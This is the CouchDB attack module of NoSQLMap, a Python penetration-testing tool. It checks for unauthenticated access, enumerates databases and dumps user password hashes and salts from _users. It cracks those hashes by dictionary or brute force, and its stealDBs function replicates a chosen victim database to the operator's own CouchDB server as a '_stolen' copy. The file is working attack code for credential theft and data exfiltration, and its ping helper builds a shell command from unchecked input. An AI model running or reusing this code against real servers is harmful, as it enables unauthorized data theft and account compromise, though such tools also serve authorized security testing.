#!/usr/bin/python
# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
# See the file 'doc/COPYING' for copying permission

from exception import NoSQLMapException
import couchdb
import urllib
import requests
import sys
import unittest
from pbkdf2 import PBKDF2
from binascii import a2b_hex
import string
import itertools
from hashlib import sha1
import os


global dbList
global yes_tag
global no_tag
yes_tag = ['y', 'Y']
no_tag = ['n', 'N']

def args():
    return []

def couchScan(target,port,pingIt):
    if pingIt == True:
        test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")

        if test == 0:
            try:
                conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")

                try:
                    dbVer = conn.version()
                    return [0,dbVer]

                except couchdb.http.Unauthorized:
                    return [1,None]

                except NoSQLMapException:
                    return [2,None]

            except NoSQLMapException:
                return [3,None]

        else:
            return [4,None]

    else:
        try:
            conn = couchdb.Server("http://" + str(target) + ":" + str(port) +"/")

            try:
                dbVer = conn.version()
                return [0,dbVer]

            except couchdb.http.Unauthorized:
                return [1,None]

            except NoSQLMapException:
                return [2,None]

        except NoSQLMapException:
            return [3,None]

def netAttacks(target,port, myIP, args = None):
    print "DB Access attacks (CouchDB)"
    print "======================"
    mgtOpen = False
    webOpen = False
    mgtSelect = True
    # This is a global for future use with other modules; may change
    dbList = []
    print "Checking to see if credentials are needed..."
    needCreds = couchScan(target,port,False)

    if needCreds[0] == 0:
        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
        print "Successful access with no credentials!"
        mgtOpen = True

    elif needCreds[0] == 1:
            print "Login required!"
            srvUser = raw_input("Enter server username: ")
            srvPass = raw_input("Enter server password: ")
            uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":" + str(port) + "/"

            try:
                conn = couchdb.Server(uri)
                print "CouchDB authenticated on " + target + ":" + str(port)
                mgtOpen = True

            except NoSQLMapException:
                raw_input("Failed to authenticate.  Press enter to continue...")
                return

    elif needCreds[0] == 2:
        conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
        print "Access check failure.  Testing will continue but will be unreliable."
        mgtOpen = True

    elif needCreds[0] == 3:
        raw_input ("Couldn't connect to CouchDB server.  Press enter to return to the main menu.")
        return


    mgtUrl = "http://" + target + ":" + str(port) + "/_utils"
    # Future rev:  Add web management interface parsing
    try:
        mgtRespCode = urllib.urlopen(mgtUrl).getcode()
        if mgtRespCode == 200:
            print "Sofa web management open at " + mgtUrl + ".  No authentication required!"

    except NoSQLMapException:
        print "Sofa web management closed or requires authentication."

    if mgtOpen == True:
        while mgtSelect:
            print "\n"
            print "1-Get Server Version and Platform"
            print "2-Enumerate Databases/Users/Password Hashes"
            print "3-Check for Attachments (still under development)"
            print "4-Clone a Database"
            print "5-Return to Main Menu"
            attack = raw_input("Select an attack: ")

            if attack == "1":
                print "\n"
                getPlatInfo(conn,target)

            if attack == "2":
                print "\n"
                enumDbs(conn,target,port)

            if attack == "3":
                print "\n"
                enumAtt(conn,target,port)

            if attack == "4":
                    print "\n"
                    stealDBs(myIP,conn,target,port)

            if attack == "5":
                    return


def getPlatInfo(couchConn, target):
    print "Server Info:"
    print "CouchDB Version: " + couchConn.version()
    return


def enumAtt(conn, target, port):
    dbList = []
    print "Enumerating all attachments..."

    for db in conn:
        dbList.append(db)

    for dbName in dbList:
        r = requests.get("http://" + target + ":" + str(port) + "/" + dbName + "/_all_docs" )
        dbDict = r.json()



def enumDbs (couchConn,target,port):
    dbList = []
    userNames = []
    userHashes = []
    userSalts = []
    try:
            for db in couchConn:
                 dbList.append(db)


            print "List of databases:"
            print "\n".join(dbList)
            print "\n"

    except NoSQLMapException:
            print "Error:  Couldn't list databases.  The provided credentials may not have rights."

    if '_users' in dbList:
        r = requests.get("http://" + target + ":" + str(port) + "/_users/_all_docs?startkey=\"org.couchdb.user\"&include_docs=true")
        userDict = r.json()

        for counter in range (0,int(userDict["total_rows"])-int(userDict["offset"])):
            if float(couchConn.version()[0:3]) < 1.3:
                userNames.append(userDict["rows"][counter]["id"].split(":")[1])
                userHashes.append(userDict["rows"][counter]["doc"]["password_sha"])
                userSalts.append(userDict["rows"][counter]["doc"]["salt"])

            else:
                userNames.append(userDict["rows"][counter]["id"].split(":")[1])
                userHashes.append(userDict["rows"][counter]["doc"]["derived_key"])
                userSalts.append(userDict["rows"][counter]["doc"]["salt"])

        print "Database Users and Password Hashes:"

        for x in range(0,len(userNames)):
            print "Username: " + userNames[x]
            print "Hash: " + userHashes[x]
            print "Salt: "+ userSalts[x]
            print "\n"

            crack = raw_input("Crack this hash (y/n)? ")

            if crack in yes_tag:
                passCrack(userNames[x],userHashes[x],userSalts[x],couchConn.version())


    return


def stealDBs (myDB,couchConn,target,port):
    dbLoot = True
    menuItem = 1
    dbList = []

    for db in couchConn:
        dbList.append(db)

    if len(dbList) == 0:
        print "Can't get a list of databases to steal.  The provided credentials may not have rights."
        return

    for dbName in dbList:
        print str(menuItem) + "-" + dbName
        menuItem += 1

    while dbLoot:
        dbLoot = raw_input("Select a database to steal:")

        if int(dbLoot) > menuItem:
            print "Invalid selection."

        else:
            break

    try:
        # Create the DB target first
        myServer = couchdb.Server("http://" + myDB + ":5984")
        targetDB = myServer.create(dbList[int(dbLoot)-1] + "_stolen")
        couchConn.replicate(dbList[int(dbLoot)-1],"http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen")

        cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")

        if cloneAnother in yes_tag:
            stealDBs(myDB,couchConn,target,port)

        else:
            return

    except NoSQLMapException:
        raw_input ("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
        return


def passCrack (user, encPass, salt, dbVer):
    select = True
    print "Select password cracking method: "
    print "1-Dictionary Attack"
    print "2-Brute Force"
    print "3-Exit"

    while select:
            select = raw_input("Selection: ")

            if select == "1":
                select = False
                dict_pass(encPass,salt,dbVer)

            elif select == "2":
                    select = False
                    brute_pass(encPass,salt,dbVer)

            elif select == "3":
                    return
    return


def genBrute(chars, maxLen):
    return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))


def brute_pass(hashVal,salt,dbVer):
    charSel = True
    print "\n"
    maxLen = raw_input("Enter the maximum password length to attempt: ")
    print "1-Lower case letters"
    print "2-Upper case letters"
    print "3-Upper + lower case letters"
    print "4-Numbers only"
    print "5-Alphanumeric (upper and lower case)"
    print "6-Alphanumeric + special characters"
    charSel = raw_input("\nSelect character set to use:")

    if charSel == "1":
        chainSet = string.ascii_lowercase

    elif charSel == "2":
        chainSet= string.ascii_uppercase

    elif charSel == "3":
        chainSet = string.ascii_letters

    elif charSel == "4":
        chainSet = string.digits

    elif charSel == "5":
        chainSet = string.ascii_letters + string.digits

    elif charSel == "6":
        chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"

    count = 0
    print "\n",

    for attempt in genBrute (chainSet,int(maxLen)):
        print "\rCombinations tested: " + str(count) + "\r"
        count += 1

        # CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
        if float(dbVer[0:3]) < 1.3:
            gotIt = gen_pass_couch(attempt,salt,hashVal)
        else:
            gotIt = gen_pass_couch13(attempt, salt, 10, hashVal)

        if gotIt == True:
                break


def dict_pass(key,salt,dbVer):
    loadCheck = False

    while loadCheck == False:
        dictionary = raw_input("Enter path to password dictionary: ")

        try:
            with open (dictionary) as f:
                passList = f.readlines()
                loadCheck = True

        except NoSQLMapException:
            print " Couldn't load file."

    print "Running dictionary attack..."

    for passGuess in passList:
        temp = passGuess.split("\n")[0]

        # CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
        if float(dbVer[0:3]) < 1.3:
            gotIt = gen_pass_couch(temp,salt,key)
        else:
            gotIt = gen_pass_couch13(temp, salt, 10, key)

        if gotIt == True:
            break

    return


def gen_pass_couch(passw, salt, hashVal):
    if sha1(passw+salt).hexdigest() == hashVal:
        print "Password Cracked - "+passw
        return True

    else:
        return False


def gen_pass_couch13(passw, salt, iterations, hashVal):
	result=PBKDF2(passw,salt,iterations).read(20)
	expected=a2b_hex(hashVal)
	if result==expected:
		print "Password Cracked- "+passw
		return True
	else:
		return False
